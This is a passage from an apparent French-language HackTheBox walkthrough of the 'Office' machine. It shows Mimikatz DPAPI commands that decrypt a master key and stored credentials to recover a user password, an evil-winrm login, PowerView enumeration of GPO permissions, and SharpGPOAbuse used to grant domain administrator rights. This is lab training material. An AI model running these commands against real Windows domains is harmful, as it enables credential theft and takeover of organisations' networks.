</code></pre><p><img src=/images/HTB-Office/Master-key-files.png alt="Credential files location"></p><blockquote><p>Les fichiers d&rsquo;identification DPAPI (Data Protection API) sont utilisés par Windows pour stocker en toute sécurité des informations sensibles, telles que les identifiants des utilisateurs, les mots de passe et d&rsquo;autres secrets. DPAPI fournit des services de cryptage que les applications peuvent utiliser pour protéger les données, en veillant à ce qu&rsquo;elles ne puissent être décryptées que par le même utilisateur que celui qui les a cryptées ou par un utilisateur disposant des clés correctes.</p></blockquote><p>Nous pouvons utiliser Mimikatz pour extraire les mots de passe des fichiers d&rsquo;identification. Pour déchiffrer un fichier d&rsquo;identification, nous devons d&rsquo;abord identifier la clé principale utilisée pour le chiffrer. Ensuite, nous devons décrypter la clé principale, puis utiliser cette clé principale décryptée pour décrypter le fichier d&rsquo;identification.</p><p>Grâce à winpeas, nous savons que seules deux des trois clés principales sont utilisées pour les fichiers d&rsquo;identification, celles qui se terminent par <code>47eb</code> et <code>fc7d</code>.</p><hr><h4 id=note>Note</h4><p>Supposons que nous ne sachions pas quelle clé principale a été utilisée pour crypter/décrypter un fichier d&rsquo;identification. Nous pouvons utiliser Mimikatz pour trouver la bonne clé.</p><pre tabindex=0><code>dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
</code></pre><p><img src=/images/HTB-Office/master-key-used.png alt="Mimikatz command to identify the correct master key used"></p><hr><p>Nous commençons par décrypter la clé utilisée par deux fichiers (celle se terminant par <code>47eb</code>).</p><pre tabindex=0><code>dpapi::masterkey /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb&#34; /rpc
</code></pre><p><img src=/images/HTB-Office/decrypted-master-key.png alt="Mimikatz command to decrypt master key"></p><p>Avec la clé principale décryptée, nous décryptons le fichier d&rsquo;identification et récupérons le mot de passe <code>H4ppyFtW183#</code>.</p><pre tabindex=0><code>dpapi::cred /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4&#34; /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</code></pre><p><img src=/images/HTB-Office/HHogan-password.png alt="hhogan password recovered"></p><p>Nous nous connectons via evil-winrm sous le nom de <code>hhogan</code>.</p><pre tabindex=0><code>evil-winrm -u &#34;HHogan&#34; -p &#34;H4ppyFtW183#&#34; -i dc.office.htb
</code></pre><p><img src=/images/HTB-Office/HHogan-shell.png alt="hhogan shell via evil-winrm"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous utilisons <code>Get-GPO -All</code> pour lister toutes les GPOs du domaine. Deux d&rsquo;entre elles attirent notre attention mais nous devons vérifier si cet utilisateur a les permissions d&rsquo;interagir avec elles. Nous notons également leurs IDs.</p><p><img src=/images/HTB-Office/Default-Domain-Policy.png alt="Default domain policy"></p><p><img src=/images/HTB-Office/Default-DC-policy.png alt="Default DC domain policy"></p><p>Avec <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a> nous énumérons les permissions GPO. Après avoir téléchargé le script, nous devons importer le module pour être en mesure de l&rsquo;utiliser.</p><pre tabindex=0><code>Import-Module ./powerview.ps1
Get-NetGroup -name &#34;GPO Managers&#34;
</code></pre><p><img src=/images/HTB-Office/Powerview-GPO-Managers.png alt="PowerView used to enumerate the GPO Managers group"></p><p>Le groupe <code>GPO Managers</code> a un SID de <code>S-1-5-21-1199398058-4196589450-691661856-1117</code>.</p><p>Nous ciblons spécifiquement la stratégie <code>Default Domain Controllers Policy</code> et énumérons ses permissions à l&rsquo;aide de PowerView.</p><pre tabindex=0><code>Get-NetGPO | Where-Object { $_.DisplayName -eq &#34;Default Domain Controllers Policy&#34; } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
</code></pre><p><img src=/images/HTB-Office/GPO-Permissions.png alt="Default Domain Controller Policy permissions"></p><p>Nous remarquons que le SID listé correspond au SID du groupe GPO Managers. De plus, <code>AceType</code> et <code>AceQualifier</code> sont tous deux configurés avec <code>AccessAllowed</code>. Ces informations confirment que les membres du groupe <code>GPO Managers</code> peuvent exercer toutes les permissions qu&rsquo;ils ont sur <code>Default Domain Controllers Policy</code>.</p><p>Nous exploitons cette mauvaise configuration et ajoutons <code>hhogan</code> au groupe des administrateurs avec un outil appelé <a href=https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0>SharpGPOAbuse</a>.</p><pre tabindex=0><code>.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Controllers Policy&#34;
</code></pre><p><img src=/images/HTB-Office/sharpgpoabuse-cmd.png alt="SharpGPOAbuse command"></p><p>Nous mettons à jour la politique pour que la tâche prenne effet.</p><pre tabindex=0><code>gpupdate /force
</code></pre><p><img src=/images/HTB-Office/gpupdate.png alt="gpudate command"></p><p>L&rsquo;utilisateur <code>hhogan</code> est maintenant membre du groupe <code>Administrators</code>.</p><p><img src=/images/HTB-Office/administrators-add.png alt="user added to the Administrators group"></p><p>Il suffit de se déconnecter et de se reconnecter pour accéder au bureau de l&rsquo;administrateur et lire <code>root.txt</code>.</p><p><img src=/images/HTB-Office/root-flag.png alt="Root flag location"></p><h2 id=mots-de-fin>Mots de Fin</h2><p>Merci d&rsquo;avoir lu mon article, si vous voulez en savoir plus sur Active Directory (ce que je vous recommande vivement), vous trouverez ci-dessous quelques ressources utiles:</p><ul><li>TryHackMe vous donne accès à deux réseaux AD gratuitement à condition que vous ayez un streak de 7 jours minimum, trouvez-les <a href=https://tryhackme.com/r/hacktivities>ici</a> dans la section <code>Networks</code>.</li><li>Ils proposent également des rooms gratuites consacrées à Active Directory, telles que <a href=https://tryhackme.com/r/room/winadbasics>Active Directory Basics</a>, <a href=https://tryhackme.com/r/room/attacktivedirectory>Attacktive Directory</a>, <a href=https://tryhackme.com/r/room/ra>Ra</a>, <a href=https://tryhackme.com/r/room/resetui>Reset</a> et <a href=https://tryhackme.com/r/room/enterprise>Enterprise</a>.</li><li>HackTheBox Academy propose plusieurs modules sur Active Directory, visitez <a href=https://academy.hackthebox.com/modules>cette</a> et cherchez &ldquo;active directory&rdquo; pour les trouver.</li><li>Si vous aimez les livres, je vous recommande particulièrement <a href=https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360>Pentesting Active Directory and Windows-based Infrastructure</a>.</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-crafty/>&#8592;
Précédent:
HTB: Crafty</a></p><p class=prev-post-date>juin 12, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-perfection/>Suivant:
HTB: Perfection
&#8594;</a></p><p class=next-post-date>juillet 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a><ul><li><a href=#shell-en-tant-que-tstark>Shell en tant que tstark</a><ul><li><a href=#enumération-de-lactive-directory>Enumération de l&rsquo;Active Directory</a></li></ul></li><li><a href=#shell-en-tant-que-ppotts>Shell en tant que ppotts</a></li><li><a href=#shell-en-tant-que-hhogan>Shell en tant que hhogan</a><ul><li><a href=#note>Note</a></li></ul></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li><li><a href=#mots-de-fin>Mots de Fin</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>